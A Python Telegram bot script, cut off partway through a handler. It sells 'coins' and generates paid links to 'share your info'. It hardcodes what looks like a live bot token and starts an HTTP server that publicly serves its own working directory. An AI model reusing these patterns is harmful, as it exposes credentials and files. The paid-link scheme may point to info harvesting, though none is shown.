import os
import telebot
import requests
import uuid
from datetime import datetime

# Constants
BOT_TOKEN = '7454502111:AAGegQ-ckH1j9i0xPXSuZ-cqwhbJ_ej7--8'  # Replace with your bot token
admins = ['6329796205']  # Replace with your admin ID

# Initialize bot and data structures
if __name__ == '__main__':
    bot = telebot.TeleBot(BOT_TOKEN)
    links = {}
    users = {}
    old_info = {}
    user_coins = {}
    waiting_for_input = {}

    # Open port 5000
    os.system("python -m http.server 5000 &")

    # Define message handlers
    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        bot.reply_to(message, "Howdy, how are you doing?")
        if message.chat.id not in user_coins:
            user_coins[message.chat.id] = 0
            bot.send_message(message.chat.id, "You have 0 coins.")
        help_message = "Available commands:\n"
        help_message += "/buy_coins - Buy coins by contacting the owner @Till_infinity_002.\n"
        help_message += "/see_old_info - See your old information.\n"
        help_message += "/generate_link - Generate a link to share your info (20 coins per link).\n"
        help_message += "/start - Start the bot."
        if message.chat.id in admins:
            help_message += "/add_coins - Add coins to a user's account."
        bot.send_message(message.chat.id, help_message)

    @bot.message_handler(commands=['buy_coins'])
    def buy_coins(message):
        bot.send_message(message.chat.id, "To buy coins, please contact the owner @Till_infinity_002.")
        bot.send_message(message.chat.id, "The price is 10 coins for $1.")

    @bot.message_handler(commands=['see_old_info'])
    ⬤